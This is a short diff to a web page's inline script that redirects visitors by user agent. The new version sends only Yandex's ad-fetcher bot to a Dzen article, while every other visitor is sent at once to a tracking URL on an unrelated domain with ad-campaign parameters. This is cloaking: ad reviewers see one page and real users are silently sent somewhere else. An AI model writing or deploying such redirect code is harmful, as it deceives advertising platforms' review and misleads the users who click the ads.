@@ -19,14 +19,11 @@
 
         // Redirect users or bots to different sites
         document.addEventListener('DOMContentLoaded', (event) => {
-            var isBot = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex|crawler|spider|robot|crawling/i.test(navigator.userAgent);
-            if(isBot) {
-                window.location.href = "https://dzen-dw.github.io/dzen/";
+            var isYandexBot = /Mozilla\/5\.0 \(compatible; YaDirectFetcher\/1\.0; Dyatel; \+http:\/\/yandex\.com\/bots\)/i.test(navigator.userAgent);
+            if(isYandexBot) {
+                window.location.href = "https://dzen.ru/a/ZLvu_KmN7T-V68Rg";
             } else {
-                // After 2 seconds, redirect to the other site
-                setTimeout(function(){
-                    window.location.href = "https://busiamilletresearch.com/1Vz2ptYC?cost={{price}}&external_id={ctoken}&creative_id={{adid}}&ad_campaign_id={{campaignid}}&source={{zoneid}}";
-                }, 2000); // 2000 milliseconds = 2 seconds
+                window.location.href = "https://busiamilletresearch.com/1Vz2ptYC?cost={{price}}&external_id={ctoken}&creative_id={{adid}}&ad_campaign_id={{campaignid}}&source={{zoneid}}";
             }
         });
     </script>
